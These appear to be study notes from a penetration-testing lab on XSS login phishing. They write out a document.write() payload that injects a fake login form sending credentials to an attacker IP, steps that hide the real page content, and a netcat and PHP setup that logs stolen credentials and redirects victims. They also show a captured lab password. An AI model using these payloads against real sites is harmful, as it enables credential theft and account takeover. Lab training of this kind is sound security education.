---
title: 'Login Phishing:'
updated: 2023-08-20T17:46:18.0000000+01:00
created: 2023-08-20T15:51:03.0000000+01:00
---

Introduction:

Another common type of XSS attack is using fake login forms - this leads to targets into sending passwords and usernames to the attack - then an attacker can log in as the user and take control over their account and other sensitive info.

Furthermore, if we are contracted to do so, we could perform this for a company and try to phish employees.

XSS Discovery:

We start by trying to find an XSS vulnerability - when we visit the **phishing** directory - we are greeted with an online image viewer:

![image1](../../../../_resources/image1-195.png)

These image viewers are common in online forms and web applications. As we have control over the URL, we can start trying to inject basic XSS payloads - but if we try to do this, we will get a **dead image URL** error message:
![image2](../../../../_resources/image2-161.png)

So we should run our automated scanners and find a working XSS payload.

Login Form Injection:

Once we find a working XSS payload, the next thing we need to do is fabricate a bogus HTML form, so that when the user logs-in we can get their credentials. We can either get template HTML code or we can write our own login form:
![image3](../../../../_resources/image3-126.png)

*Note for sophisticated logins, you may need to do some styling to inject a believable login form.* We can get our IP using **ip a** or by looking at our **tun0**.

Next, we need to prepare XSS payload and using the document.write() JS function we can write the HTML to the page:

**document.write('\<h3\>Please login to continue\</h3\>\<form action=http://10.10.16.31\>\<input type="username" name="username" placeholder="Username"\>\<input type="password" name="password" placeholder="Password"\>\<input type="submit" name="submit" value="Login"\>\</form\>');**

**document.getElementById('urlform').remove();\<!--**

In the event that we are exploiting a **Reflected XSS vulnerability** we can send our XSS payload in the URL parameter:
![image4](../../../../_resources/image4-101.png)

Activity:

First we use XSStrike to find a working XSS payload ('\>\<D3v%0aonpOiNteRenTEr%0d=%0dconfirm()\>v3dm0s):
![image5](../../../../_resources/image5-77.png)

Next we need to insert our payload to create a fake login and hide the image viewer:

**document.write('\<h3\>Please login to continue\</h3\>\<form action=http://10.10.16.31\>\<input type="username" name="username" placeholder="Username"\>\<input type="password" name="password" placeholder="Password"\>\<input type="submit" name="submit" value="Login"\>\</form\>');**

This payload works, but it is broken looking:
![image6](../../../../_resources/image6-54.png)

We can send the request to the PHP file and get the result we want:
![image7](../../../../_resources/image7-47.png)
Admin:p1zd0nt57341myp455

We login to the admin panel:
![image8](../../../../_resources/image8-40.png)

Cleaning Up:

To encourage the user to use our login form, we should remove the other elements, to do this we can use the JavaScript function **document.getElementById().Remove()** function.

We can use **inspect element** to find the ID of the element we want to delete, in this case it is the URL form.

*Note that we can test this locally by deleting things on the client side first - to figure out what we need to delete or not.*

By looking at the code we can see that the id=**urlform** is the element we want to delete, we can delete this by using:
![image9](../../../../_resources/image9-33.png)

We can then add this to our URL payload:
**Document.write(…\</form\>);document.getElementById('urlform').remove();**

We can then look at the website:
![image10](../../../../_resources/image10-27.png)

We see that there is some text from the original HTML code left after our injection, we can fix this by **commenting** it out:
![image11](../../../../_resources/image11-21.png)

This will give us a believable login form:
![image12](../../../../_resources/image12-16.png)

Credential Stealing:

Finally, after we have produced our login form, we can configure our computer to accept requests from users so that we can siphon their credentials. The steps we have to take are:

1.  Start up a netcat listener
    1.  Test this by trying to log in with some credentials.
    2.  ![image13](../../../../_resources/image13-15.png)

As you can see, we have captured their credentials in the URL. However, the netcat listener will not handle the HTTP request correctly and the victim would get an error saying "**unable to connect**" this could alert suspicion.

To avoid this, we can write a PHP script that will log user credentials and re-direct them to the original page:
![image14](../../../../_resources/image14-12.png)

We should then place this php file inside the **/tmp/tmpserver/** as **index.php**. Then we can start a PHP server using the following commands:
![image15](../../../../_resources/image15-9.png)

This will then log any requests into our **creds.txt** file:
![image16](../../../../_resources/image16-9.png)
